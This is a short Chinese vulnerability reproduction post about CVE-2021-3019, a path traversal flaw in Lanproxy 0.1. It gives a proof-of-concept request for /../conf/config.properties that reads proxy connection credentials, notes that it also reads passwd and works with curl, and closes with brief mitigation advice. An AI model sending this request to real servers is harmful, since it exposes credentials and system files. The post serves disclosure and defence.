![1610363765_5ffc3375e3faee3226781.png!small](https://image.3001.net/images/20210111/1610363765_5ffc3375e3faee3226781.png!small)

Lanproxy 路径遍历漏洞 (CVE-2021-3019)

## 一、漏洞简介

Lanproxy是一个将局域网个人电脑、服务器代理到公网的内网穿透工具，支持tcp流量转发，可支持任何tcp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面等等）本次Lanproxy
路径遍历漏洞
(CVE-2021-3019)通过../绕过读取任意文件。该漏洞允许目录遍历读取/../conf/config.properties来获取到内部网连接的凭据。

## 二、影响版本

lanproxy 0.1

## 三、漏洞复现

环境安装移步：

https://www.jianshu.com/p/6482ac354d34

Poc:/../conf/config.properties

![1610363766_5ffc3376584cad15c0d01.png!small](https://image.3001.net/images/20210111/1610363766_5ffc3376584cad15c0d01.png!small)

GET/../conf/config.propertiesHTTP/1.1Host: 127.0.0.1:8080Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.67 Safari/537.36
Edg/87.0.664.52Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6Connection: close

读取passwd

![1610363767_5ffc337708ece26455f32.png!small](https://image.3001.net/images/20210111/1610363767_5ffc337708ece26455f32.png!small)

curl访问也行

![1610363768_5ffc3378546fe1195e03c.png!small](https://image.3001.net/images/20210111/1610363768_5ffc3378546fe1195e03c.png!small)

## 四、安全建议

升级版本，和防火墙做相关路径../跳跃限制。

参考：

https://mp.weixin.qq.com/s/t8Nn3Nb4-cXh-2IfCA6mzw

https://www.cnblogs.com/limanman233/p/14239071.html

免责声明：本站提供安全工具、程序(方法)可能带有攻击性，仅供安全研究与教学之用，风险自负!

转载声明：著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

订阅查看更多复现文章、学习笔记

thelostworld

安全路上，与你并肩前行！！！！

![1610363769_5ffc33794f1b69abc6239.jpg!small](https://image.3001.net/images/20210111/1610363769_5ffc33794f1b69abc6239.jpg!small)

个人知乎：https://www.zhihu.com/people/fu-wei-43-69/columns

个人简书：https://www.jianshu.com/u/bf0e38a8d400

个人CSDN：https://blog.csdn.net/qq_37602797/category_10169006.html

个人博客园：https://www.cnblogs.com/thelostworld/

FREEBUF主页：https://www.freebuf.com/author/thelostworld?type=article

![1610363769_5ffc33799cf839449aee9.png!small](https://image.3001.net/images/20210111/1610363769_5ffc33799cf839449aee9.png!small)

欢迎添加本公众号作者微信交流，添加时备注一下“公众号”

![1610363769_5ffc3379e70af5792ec45.png!small](https://image.3001.net/images/20210111/1610363769_5ffc3379e70af5792ec45.png!small)

  

